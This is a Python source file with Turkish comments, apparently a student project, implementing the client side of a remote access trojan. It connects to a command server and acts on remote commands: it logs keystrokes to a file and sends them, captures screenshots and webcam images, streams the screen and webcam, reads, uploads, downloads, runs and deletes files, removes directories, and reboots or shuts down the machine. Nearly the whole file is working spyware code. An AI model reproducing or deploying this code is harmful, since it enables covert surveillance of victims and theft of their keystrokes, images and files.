# CREATED BY ATA GÜRSEL
# 215060044

import random  # Rastgele sayılar üretmek için kullanılan modül
import socket, os  # Socket ile ağ bağlantısı, os ile işletim sistemine bağlı işlemler
from threading import Thread  # Çoklu iş parçacığı (thread) kullanmak için gerekli modül
from PIL import Image  # Python Imaging Library modülü, resim işleme için kullanılır
from ctypes import cast, POINTER  # Windows API fonksiyonlarına erişim için ctypes modülü
from comtypes import CLSCTX_ALL  # Component Object Model (COM) nesnelerine erişim için kullanılan modül
from winreg import *  # Windows kayıt defteri (Registry) ile ilgili işlemler için modül
import shutil  # Dosya ve klasör işlemleri için kullanılan modül
import glob  # Dosya adı eşleştirmeleri için kullanılan modül
import ctypes  # Windows API fonksiyonlarına erişim için ctypes modülü
import webbrowser  # Web tarayıcısı açma işlemleri için kullanılan modül
import re  # Regular expression (düzenli ifade) işlemleri için kullanılan modül
import pyautogui  # Fare ve klavye işlemleri için kullanılan modül
import cv2  # OpenCV kütüphanesi, görüntü işleme ve bilgisayar görüşü için kullanılır
from pynput.keyboard import Listener  # Klavye olaylarını dinlemek için kullanılan modül

# Windows DLL'lerine erişim için ctypes modülü
user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

# Windows için özel sabitler
HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2

# RAT_CLIENT sınıfı
class RAT_CLIENT:
    def __init__(self, host, port):
        # İstemcinin bağlantı bilgilerini ve çalışma dizinini tutan sınıf özellikleri
        self.host = host
        self.port = port
        self.curdir = os.getcwd()

    def build_connection(self):
        # Sunucuyla bağlantı kurma işlemleri
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        sending = socket.gethostbyname(socket.gethostname())
        s.send(sending.encode())
    
    def errorsend(self):
        # Hata durumunda sunucuya "no output" mesajını şifreleyerek gönderme işlemi
        output = bytearray("no output", encoding='utf8')
        for i in range(len(output)):
            output[i] ^= 0x41
        s.send(output)
    
    def keylogger(self):
        # Klavye olaylarını dinleyip keylogs.txt dosyasına kaydetme işlemi
        def on_press(key):
            if klgr == True:
                with open('keylogs.txt', 'a') as f:
                    f.write(f'{key}')
                    f.close()

        with Listener(on_press=on_press) as listener:
            listener.join()
    
    def execute(self):
        # Ana işlev: Sunucudan gelen komutları işleme
        while True:
            command = s.recv(1024).decode()

            # "screenshare" komutu: Ekran paylaşımı başlatma
            if command == 'screenshare':
                try:
                    from vidstream import ScreenShareClient
                    screen = ScreenShareClient(self.host, 8080)
                    screen.start_stream()
                except:
                    s.send("Impossible to get screen")
            
            # "webcam" komutu: Webcam görüntüsü alma
            elif command == 'webcam':
                try:
                    from vidstream import CameraClient
                    cam = CameraClient(self.host, 8080)
                    cam.start_stream()
                except:
                    s.send("Impossible to get webcam")
            
            # "breakstream" komutu: Ekran paylaşımı veya webcam görüntüsü alma işlemini sonlandırma
            elif command == 'breakstream':
                pass
                  
            elif command == 'volumeup':
              # "volumeup" komutu: Bilgisayarın ses seviyesini artırma işlemi
                try:
                    # Ses kontrolü için pycaw kütüphanesini kullanma
                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    if volume.GetMute() == 1:
                        volume.SetMute(0, None)
                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
                    s.send("Volume is increased to 100%".encode())
                except:
                    s.send("Module is not founded".encode())
            
            elif command == 'volumedown':
               # "volumeup" komutu: Bilgisayarın ses seviyesini azaltma işlemi
                try:
                  # Ses kontrolü için pycaw kütüphanesini kullanma
                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
                    s.send("Volume is decreased to 0%".encode())
                except:
                    s.send("Module is not founded".encode())
            
            elif command == 'reboot':
                 # Bilgisayarı yeniden başlatır.
                os.system("shutdown /r /t 1")
                s.send(f'{socket.gethostbyname(socket.gethostname())} is being rebooted'.encode())

                 # Eğer komut "shutdown" ise, bilgisayarı kapatır ve bu durumu sunucuya bildirir.
            elif command == 'shutdown':
                os.system('shutdown /s /t 1')
                sending = f"{socket.gethostbyname(socket.gethostname())} was shutdown"
                s.send()
            
            elif command[:7] == 'writein':
             # Klavye girişi yapar.
                pyautogui.write(command.split(" ")[1])
                s.send(f'{command.split(" ")[1]} is written'.encode())
            
            elif command[:8] == 'readfile':
                try:
                  # Belirtilen dosyayı okur ve içeriği istemciye gönderir.
                    f = open(command[9:], 'r')
                    data = f.read()
                    if not data: s.send("No data".encode())
                    f.close()
                    s.send(data.encode())
                except:
                   # Dosya bulunamazsa veya bir hata olursa istemciye hata mesajı gönderilir.
                    s.send("No such file in directory".encode())

            # Mesaj Gönderme İşlemi.
            elif command == 'sendmessage':
                    # Sunucudan metin ve başlık bilgisini alır.
                text = s.recv(6000).decode()
                title = s.recv(6000).decode()
                    # Kullanıcıya bir mesaj penceresi açar.
                s.send('MessageBox has appeared'.encode())
                user32.MessageBoxW(0, text, title, 0x00000000 | 0x00000040)

                # Monitörü Kapatma İşlemi.
            elif command == 'turnoffmon':
                    # Sunucuya monitör kapatıldı mesajını gönderir.
                s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned off".encode())
                    # Monitörü kapatma işlemini gerçekleştirir.
                user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)

            # Monitörü Açma İşlemi.
            elif command == 'turnonmon':
                    # Sunucuya monitör açıldı mesajını gönderir.
                s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned on".encode())
                    # Monitörü açma işlemini gerçekleştirir.
                user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)

              # Keylogger'ı Başlatma İşlemi.
            elif command == 'start_keylogger':
             # Keylogger'ı başlatma işlemine hazırlık yapar.
                global klgr
                klgr = True
                kernel32.CreateFileW(b'keylogs.txt', GENERIC_WRITE & GENERIC_READ, 
                FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                None, CREATE_ALWAYS , 0, 0)
                    # Keylogger'ı başlatan bir Thread oluşturur.
                Thread(target=self.keylogger, daemon=True).start()
                s.send("Keylogger is started".encode())
                
            # Keylogger'ın Kayıtlarını Gönderme İşlemi.
            elif command == 'send_logs':
                try:
                    # 'keylogs.txt' dosyasını açar, içeriğini alır ve sunucuya gönderir.
                    f = open("keylogs.txt", 'r')
                    lines = f.readlines()
                    f.close()
                    s.send(str(lines).encode())
                     # 'keylogs.txt' dosyasını siler.
                    os.remove('keylogs.txt')
                except:
                    self.errorsend()

            # Keylogger'ı Durdurma İşlemi.
            elif command == 'stop_keylogger':
                 # Keylogger'ı durdurma işlemini gerçekleştirir.
                klgr = False
                s.send("The session of keylogger is terminated".encode())

               # Dosya Silme İşlemi.
            elif command[:7] == 'delfile':
                try:
                 # Belirtilen dosyayı siler ve başarılı bir mesaj gönderir.
                    os.remove(command[8:])
                    s.send(f'{command[8:]} was successfully deleted'.encode())
                except:
                    self.errorsend()

            # Dosya Düzenleme İşlemi.
            elif command[:8] == 'editfile':
                try:
              # Belirtilen dosyaya belirtilen metni ekler ve başarılı bir mesaj gönderir.
                    with open(command.split(" ")[1], 'a') as f:
                        f.write(command.split(" ")[2])
                        f.close()
                    sending = f'{command.split(" ")[2]} was written to {command.split(" ")[1]}'
                    s.send(sending.encode())
                except:
                    self.errorsend()

            # Dosya Kopyalama İşlemi.
            elif command[:2] == 'cp':
                try: 
              # Belirtilen dosyayı belirtilen yere kopyalar ve başarılı bir mesaj gönderir.
                    shutil.copyfile(command.split(" ")[1], command.split(" ")[2])
                    s.send(f'{command.split(" ")[1]} was copied to {command.split(" ")[2]}'.encode())
                except:
                    self.errorsend()

            # Dosya Taşıma İşlemi.
            elif command[:2] == 'mv':
                try:
               # Belirtilen dosyayı belirtilen yere taşır ve başarılı bir mesaj gönderir.
                    shutil.move(command.split(" ")[1], command.split(" ")[2])
                    s.send(f'File was moved from {command.split(" ")[1]} to {command.split(" ")[2]}'.encode())
                except:
                    self.errorsend()
            
            # Eğer komut "createfile" ise, belirtilen dosyayı oluşturur ve bu durumu sunucuya bildirir.
            elif command[:10] == 'createfile':
                kernel32.CreateFileW(command[11:], GENERIC_WRITE & GENERIC_READ, 
                FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                None, CREATE_ALWAYS , 0, 0)
                s.send(f'{command[11:]} was created'.encode())
                
# Eğer komut "searchfile" ise, belirtilen dizin altındaki dosyalar arasında bir dosya arar ve bulduğu dosyanın yolunu sunucuya bildirir.
            elif command[:10] == 'searchfile':
                for x in glob.glob(command.split(" ")[2]+"\\**\*", recursive=True):
                    if x.endswith(command.split(" ")[1]):
                        path = os.path.abspath(x)
                        s.send(str(path).encode())
                    else:
                        continue

            #  Eğer komut "startfile" ise, belirtilen dosyayı çalıştırır ve bu durumu sunucuya bildirir.
            elif command[:9] == 'startfile':
                try:
                    s.send(f'{command[10:]} was started'.encode())
                    os.startfile(command[10:])
                except:
                    self.errorsend()
#  Eğer komut "download" ise, belirtilen dosyayı açar, içeriğini okur ve sunucuya gönderir.
            elif command[:8] == 'download':
                try:
                    file = open(command.split(" ")[1], 'rb')
                    data = file.read()
                    s.send(data)
                except:
                    self.errorsend()
#  Eğer komut "upload" ise, sunucudan bir dosya adı alır, ardından dosyayı alır ve bu dosyayı belirtilen adla kaydeder.
            elif command == 'upload':
                filename = s.recv(6000)
                newfile = open(filename, 'wb')
                data = s.recv(6000)
                newfile.write(data)
                newfile.close()
            # Eğer komut "mkdir" ise, belirtilen dizinde yeni bir klasör oluşturur ve bu durumu sunucuya bildirir.
            elif command[:5] == 'mkdir':
                try:
                    os.mkdir(command[6:])
                    s.send(f'Directory {command[6:]} was created'.encode())
                except:
                    self.errorsend()
            # Eğer komut "rmdir" ise, belirtilen dizini ve içeriğini siler ve bu durumu sunucuya bildirir.
            elif command[:5] == 'rmdir':
                try:
                    shutil.rmtree(command[6:])
                    s.send(f'Directory {command[6:]} was removed'.encode())
                except:
                    self.errorsend()
            #  Eğer komut "browser" ise, sunucudan bir sorgu alır, ardından bu sorguya göre bir tarayıcı sekmesi açar ve bu durumu sunucuya bildirir.
            elif command == 'browser':
                query = s.recv(6000)
                query = query.decode()
                try:
                    if re.search(r'\.', query):
                        webbrowser.open_new_tab('https://' + query)
                    elif re.search(r'\ ', query):
                        webbrowser.open_new_tab('https://www.google.com/search?q='+ query)
                    else:
                        webbrowser.open_new_tab('https://www.google.com/search?q=' + query)
                    s.send("The tab is opened".encode())
                except:
                    self.errorsend()
            # Eğer komut "screenshot" ise, bilgisayarın ekranını yakalar, boyutunu değiştirir, ve bu ekran görüntüsünü sunucuya gönderir.
            elif command == 'screenshot':
                try:
                    file = f'{random.randint(111111, 444444)}.png'
                    file2 = f'{random.randint(555555, 999999)}.png'
                    pyautogui.screenshot(file)
                    image = Image.open(file)
                    new_image = image.resize((1920, 1080))
                    new_image.save(file2)
                    file = open(file2, 'rb')
                    data = file.read()
                    s.send(data)
                except:
                    self.errorsend()
            # Eğer komut "webcam_snap" ise, bilgisayarın kamerası ile bir fotoğraf çeker, boyutunu değiştirir ve bu fotoğrafı sunucuya gönderir.
            elif command == 'webcam_snap':
                try:
                    file = f'{random.randint(111111, 444444)}.png'
                    file2 = f'{random.randint(555555, 999999)}.png'
                    global return_value, i
                    cam = cv2.VideoCapture(0)
                    for i in range(1):
                        return_value, image = cam.read()
                        filename = cv2.imwrite(f'{file}', image)
                    del(cam)
                    image = Image.open(file)
                    new_image = image.resize((1920, 1080))
                    new_image.save(file2)
                    file = open(file2, 'rb')
                    data = file.read()
                    s.send(data)
                except:
                    self.errorsend()
            # Eğer komut "exit" ise, sunucuya "exit" mesajı gönderir ve döngüden çıkar, bu da programın sona ermesini sağlar.
            elif command == 'exit':
                s.send(b"exit")
                break

# RAT_CLIENT nesnesini oluştur
rat = RAT_CLIENT('127.0.0.1', 5555)

# Ana program
if __name__ == '__main__':
    rat.build_connection()
    rat.execute()